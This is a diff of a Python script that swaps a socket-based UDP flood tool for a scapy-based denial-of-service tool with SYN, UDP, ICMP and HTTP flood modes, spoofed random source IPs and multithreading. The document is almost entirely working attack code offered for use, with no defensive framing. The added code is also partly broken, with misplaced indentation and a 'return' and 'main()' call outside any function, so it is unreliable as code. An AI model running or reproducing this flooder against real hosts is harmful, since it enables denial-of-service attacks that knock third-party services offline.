@@ -1,121 +1,129 @@
 #!usr/bin/python
 # _*_ coding: utf-8 _*_
 import os
-import socket
-import sys
-import time
+from sys import stdout
+from scapy.all import *
+from random import randint
+from argparse import ArgumentParser
 import threading
-import string
-import random
-import fade
- 
-# Color
-class bcolors:
-    Z = '\033[97m'
-    H = '\033[95m'
-    A = '\033[94m'
-    N = '\033[96m'
-    WARNING = '\033[93m'
-    A = '\033[92m'
-    H = '\033[31m'
-    M = '\033[32m'
-    A = '\033[33m'
-    D = '\033[91m'
-    RESET = '\033[0m'
-    g = '\033[1m'
-    g = '\033[4m'
-    
+import time
+
+
+# Flooding Attack Tool
 os.system('clear')
-logo = """      
-            ¶¶¶      ¶¶¶          ¶¶    ¶¶¶          ¶¶¶ ¶¶ ¶¶
-           ¶¶¶ ¶¶     ¶¶¶        ¶¶    ¶¶¶ ¶¶      ¶¶¶
-          ¶¶¶   ¶¶     ¶¶¶      ¶¶    ¶¶¶   ¶¶    ¶¶¶
-         ¶¶¶     ¶¶     ¶¶¶    ¶¶    ¶¶¶     ¶¶    ¶¶¶
-        ¶¶¶       ¶¶     ¶¶¶  ¶¶    ¶¶¶       ¶¶      ¶¶¶ ¶¶
-       ¶¶¶         ¶¶     ¶¶¶      ¶¶¶         ¶¶            ¶¶
-      ¶¶¶  ¶¶ ¶¶ ¶¶ ¶¶     ¶¶¶    ¶¶¶  ¶¶ ¶¶ ¶¶ ¶¶           ¶¶
-     ¶¶¶             ¶¶    ¶¶¶   ¶¶¶             ¶¶  ¶¶ ¶¶ ¶¶
-  
-===================≠======≠==============================≠============
+print("""
 
-\033[33m                BIRRUH  BIDDAM  NAFDHIKA YAA AQSHA                 
-\033[33m                          design By: Za'99                          
-\033[33m                                 |                                 
-\033[33m                             --oO0Oo--                              
 
-=================≠====================================================
-"""
-faded_text = fade.fire(logo)
-print(faded_text)
-if len(sys.argv) < 4:
-    sys.exit("\033[96mUsage: python "+sys.argv[0]+" <ip> <port> <size>\033[0m")
 
-ip = sys.argv[1]
-port = int(sys.argv[2])
-size = int(sys.argv[3])
-packets = int(sys.argv[3])
-class syn(threading.Thread):
-    def __init__(self, ip, port, packets):
-        time.sleep(3),
-        self.ip = ip
-        self.port = port
-        self.packets = packets
-        self.syn = socket.socket()
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                self.syn.connect((self.ip, self.port))
-            except:
-                pass
+""")
+    time.sleep(1)
+    parser = ArgumentParser()
+    parser.add_argument("--SynFlood", "-s", action='store_true', help="Syn Flood Attack")
+    parser.add_argument("--UDPFlood", "-u", action='store_true', help="UDP Flood Attack")
+    parser.add_argument("--ICMPFlood", "-i", action='store_true', help="ICMP Flood Attack")
+    parser.add_argument("--HTTPFlood", "-H", action='store_true', help="HTTP Flood Attack")
+    parser.add_argument("--target", "-t", required=True, help="target IP address")
+    parser.add_argument("--port", "-p", default=80, help="target port number")
+    parser.add_argument("--thread", "-T", default=10, help="target port number")
+    parser.add_argument(
+        "--repeat", "-r", default=100, help="attack number of repetition"
+    )
 
-class tcp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                socket.connect(self.ip, self.port)
-                socket.setblocking(0)
-                socket.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
+    args = parser.parse_args()
+    
+    dstIP = args.target
+    dstPort = args.port
+    repeat = args.repeat
 
-class udp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                if self.port == 0:
-                    self.port = random.randrange(1, 65535)
-                self.udp.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
+    if args.SynFlood:
+        target = SynFlood
+    elif args.UDPFlood:
+        target = UDPFlood
+    elif args.ICMPFlood:
+        target = ICMPFlood
+    elif args.HTTPFlood:
+        target = HTTPFlood
+    else:
+        print("-"*35 + "Attack Type is Missing"+35*"-"+"\n")
+        return
+    
+    threads =[]
+    for _ in range(int(args.thread)):
+        t = threading.Thread(target=target,args=(dstIP,dstPort,int(repeat)))
+        t.start()
+        threads.append(t)
+    for thread in threads:
+        thread.join()
 
-while True:
-    try:
-        if size > 65507:
-            sys.exit("Invalid Number Of Packets!")
-        u = udp(ip,port,size,packets)
-        u.start()
-        print("\033[33m[\033[1m+\033[33m] \033[92mRequest " +str(self)+ "  \033[33mto Sent attack \033[97m  \033[96m-->  \033[95m" +ip+ "")
-        time.sleep(1)
-    except KeyboardInterrupt:
-        print ("Stopping Flood!")
-        sys.exit()
-    except socket.error as e:
-        print ("Socket Couldn't Connect")
-        sys.exit()
+def randomSrcIP():
+    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
+    return ip 
+
+def randomPort():
+    port = randint(0, 65535)
+    return port
+
+def SynFlood(dstIP,dstPort,repeat):
+    for x in range(int(repeat)):
+        IP_Packet = IP()
+        IP_Packet.src = randomSrcIP()
+        IP_Packet.dst = dstIP
+
+        TCP_Packet = TCP()
+        TCP_Packet.sport = randomPort() 
+        TCP_Packet.dport = dstPort
+        TCP_Packet.flags = "S"
+        send(IP_Packet/TCP_Packet,verbose=False)
+        print("-"*35 + "SYN Packet is Successfuly sended"+35*"-"+"\n")
+
+def HTTPFlood(dstIP,dstPort,repeat):
+    for x in range(repeat):
+        try:
+            IP_Packet = IP()
+            IP_Packet.dst = dstIP
+            IP_Packet.src = randomSrcIP()
+
+            TCP_Packet = TCP()
+            TCP_Packet.sport = randomPort()
+            TCP_Packet.dport = dstPort
+            TCP_Packet.flags="S"
+            
+            syn = IP_Packet/TCP_Packet
+            packet_SynAck = sr1(syn,timeout=1,verbose=False)
+            
+            if(packet_SynAck is None):
+                print("-"*35 + "ACK+SYN Packet is Filtered"+35*"-"+"\n")
+                continue
+            TCP_Packet.flags="A"
+            TCP_Packet.seq = packet_SynAck[TCP].ack
+            TCP_Packet.ack= packet_SynAck[TCP].seq+1
+            getStr='GET / HTTP/1.0\n\n'
+
+            send(IP_Packet/TCP_Packet/getStr,verbose=False)
+            print("-"*35 + "HTTP Packet is Successfuly sended"+35*"-"+"\n")
+        except:
+            print("-"*35 + "Error Occured during Sending packets"+35*"-"+"\n")
+
+def UDPFlood(dstIP,dstPort,repeat):
+    data = "A"*1250
+    for x in range(repeat):
+        IP_Packet = IP()
+        IP_Packet.src = randomSrcIP()
+        IP_Packet.dst = dstIP
+
+        UDP_Packet = UDP()
+        UDP_Packet.dport = randomPort()
+        send(IP_Packet/UDP_Packet/Raw(load=data),verbose=False)
+        print("-"*35 + "UDP Packet is Successfuly sended"+35*"-"+"\n")
+
+def ICMPFlood(dstIP,dstPort,repeat):
+    for x in range(repeat):
+        IP_Packet = IP()
+        IP_Packet.src = dstIP
+        IP_Packet.dst = randomSrcIP()
+        ICMP_Packet = ICMP()
+        send(IP_Packet/ICMP(),verbose=False)
+    print("-"*35 + "ICMP Packet is Successfuly sended"+35*"-"+"\n")
+
+
+main()
